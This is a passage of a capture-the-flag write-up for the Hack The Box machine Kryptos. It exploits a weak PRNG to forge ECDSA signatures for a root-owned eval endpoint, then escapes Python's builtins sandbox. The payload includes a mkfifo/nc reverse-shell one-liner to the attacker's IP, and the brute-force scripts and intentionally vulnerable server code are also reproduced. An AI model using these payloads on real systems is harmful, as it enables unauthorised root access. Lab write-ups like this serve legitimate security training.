![](/assets/images/htb-writeup-kryptos/xor1.png)

![](/assets/images/htb-writeup-kryptos/xor2.png)

The password for `rijndael` is `bkVBL8Q9HuBSpj`

I can log in and get the first flag:

```
# ssh rijndael@kryptos.htb
rijndael@kryptos.htb's password:
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Wed Mar 13 12:31:55 2019 from 192.168.107.1

rijndael@kryptos:~$ cat user.txt
92b69...
```

### Privesc

The next target is obvious: there's a python script running as root with a webserver on port 81.

```
rijndael@kryptos:~/kryptos$ ps -ef | grep python3
[...]
root       772     1  0 Apr07 ?        00:00:07 /usr/bin/python3 /root/kryptos.py
root       846   772  0 Apr07 ?        00:01:35 /usr/bin/python3 /root/kryptos.py
```

Source code is in `~/kryptos/kryptos.py`:

```python
import random
import json
import hashlib
import binascii
from ecdsa import VerifyingKey, SigningKey, NIST384p
from bottle import route, run, request, debug
from bottle import hook
from bottle import response as resp


def secure_rng(seed):
    # Taken from the internet - probably secure
    p = 2147483647
    g = 2255412

    keyLength = 32
    ret = 0
    ths = round((p-1)/2)
    for i in range(keyLength*8):
        seed = pow(g,seed,p)
        if seed > ths:
            ret += 2**i
    return ret

# Set up the keys
seed = random.getrandbits(128)
rand = secure_rng(seed) + 1
sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
vk = sk.get_verifying_key()

def verify(msg, sig):
    try:
        return vk.verify(binascii.unhexlify(sig), msg)
    except:
        return False

def sign(msg):
    return binascii.hexlify(sk.sign(msg))

@route('/', method='GET')
def web_root():
    response = {'response':
                {
                    'Application': 'Kryptos Test Web Server',
                    'Status': 'running'
                }
                }
    return json.dumps(response, sort_keys=True, indent=2)

@route('/eval', method='POST')
def evaluate():
    try:
        req_data = request.json
        expr = req_data['expr']
        sig = req_data['sig']
        # Only signed expressions will be evaluated
        if not verify(str.encode(expr), str.encode(sig)):
            return "Bad signature"
        result = eval(expr, {'__builtins__':None}) # Builtins are removed, this should be pretty safe
        response = {'response':
                    {
                        'Expression': expr,
                        'Result': str(result)
                    }
                    }
        return json.dumps(response, sort_keys=True, indent=2)
    except:
        return "Error"

# Generate a sample expression and signature for debugging purposes
@route('/debug', method='GET')
def debug():
    expr = '2+2'
    sig = sign(str.encode(expr))
    response = {'response':
                {
                    'Expression': expr,
                    'Signature': sig.decode()
                }
                }
    return json.dumps(response, sort_keys=True, indent=2)

run(host='127.0.0.1', port=81, reloader=True)
```

The first thing that jumps out is the `eval()` expression. It's been somewhat "hardened" since the builtins are disabled, but there's a way to bypass that. But first, I need to generate a valid signature for the expression to be evaluated.

The second thing is the PRNG function `secure_rng` seems suspicious. I'm no crypto or math expert but when I run the function multiple times I see the same values generated quite often which indicates a broken PRNG.

I took the function and put it in a new script to test the entropy of the values generated.

```python
import random

def secure_rng(seed):
    # Taken from the internet - probably secure
    p = 2147483647
    g = 2255412

    keyLength = 32
    ret = 0
    ths = round((p-1)/2)
    for i in range(keyLength*8):
        seed = pow(g,seed,p)
        if seed > ths:
            ret += 2**i
    return ret

for i in range(0,100):
    seed = random.getrandbits(128)
    rand = secure_rng(seed) + 1
    print rand
```

```
# python testrng.py
100
59763658961195455702488250327064726633945798537104807246171656262148713381967
5
115792089237316195423570985008687907853269984665640564039457584007913129639931
7470457370149431962811031290883090829243224817138100905771457032768594248078
25
59763658961195455702488250327064726633945798537104807246171656262148754428249
59763658961195455702488250327064726633945798537104807246171656262148712113590
2
7470457370149431962811031290883090829243224817138100905771457032768589009034
[...]
14940914740298863925622062581766181658486449634276201811542914065537178345491
17
14940914740298863925622062581766181658486449634276201811542914065537188607221
[...]
7470457370149431962811031290883090829243224817138100905771457032768594248078
1
29881829480597727851244125163532363316972899268552403623085828131074356036114
2
38
6
59763658961195455702488250327064726633945798537104807246171656262148712073505
[...]
29881829480597727851244125163532363316972899268552403623085828131074356690984
6
1
59763658961195455702488250327064726633945798537104807246171656262148713381985
11
3735228685074715981405515645441545414621612408569050452885728516384297124039
6
3735228685074715981405515645441545414621612408569050452885728516384297124039
3735228685074715981405515645441545414621612408569050452885728516384378329292
```

Some numbers repeat multiple times which is very unusual. I can test how many tries it takes on average to get a specific value (2 for example):

```python
import random

def secure_rng(seed):
    # Taken from the internet - probably secure
    p = 2147483647
    g = 2255412

    keyLength = 32
    ret = 0
    ths = round((p-1)/2)
    for i in range(keyLength*8):
        seed = pow(g,seed,p)
        if seed > ths:
            ret += 2**i
    return ret

tries = 0

for i in range(0,100):
    while True:
        tries = tries + 1
        seed = random.getrandbits(128)
        rand = secure_rng(seed) + 1
        if rand == 2:
            break

print("It took on average %d times to get the same value twice" % (tries / 100))
```

```
# python testrng.py
It took on average 23 times to get the same value twice
```

This confirms that the PRNG is totally broken. So in theory I should able to submit any eval request and it'll work after a few attempts. To test, I'll do a local port forward with SSH first:

```
# ssh -L 81:127.0.0.1:81 rijndael@kryptos.htb
rijndael@kryptos.htb's password:
```

Then I modify the script to take the expression from CLI argument and submit it until I get a valid signature:

```python
if len(sys.argv) != 2:
    print "Usage: expr.py <expr>"

headers = { "Content-Type": "application/json"}
expr = sys.argv[1]

tries = 0
while True:
    tries = tries + 1
    seed = random.getrandbits(128)
    rand = secure_rng(seed) + 1
    sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
    vk = sk.get_verifying_key()

    d = create_sig(expr)
    data = '{ "expr": \"%s\", "sig": "%s" }' % (expr, json.loads(d)['response']['Signature'])
    r = requests.post("http://127.0.0.1:81/eval", data=data, headers=headers)
    if 'Bad signature' not in r.text:
        print "Found a valid signature after %d tries" % tries
        print r.text
        exit()
```

The script works and after a few seconds I get a valid signature and the expression I submitted gets evaluated.

```
# python expr.py "'This '+'is'+' working'"
Found a valid signature after 4 tries
{
  "response": {
    "Expression": "'This '+'is'+' working'",
    "Result": "This is working"
  }
}
```

Now I need to fix the last part: find a way to bypass the empty builtins set on the eval function. This a classic Python CTF challenge and there are multiple blogs showing various ways to jail escape this.

```
# python expr.py "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 4444 >/tmp/f')"
```

My eval works now and I get a reverse shell as `root`:

```
# nc -lvnp 4444
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.129.
Ncat: Connection from 10.10.10.129:44552.
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
6256d6...
```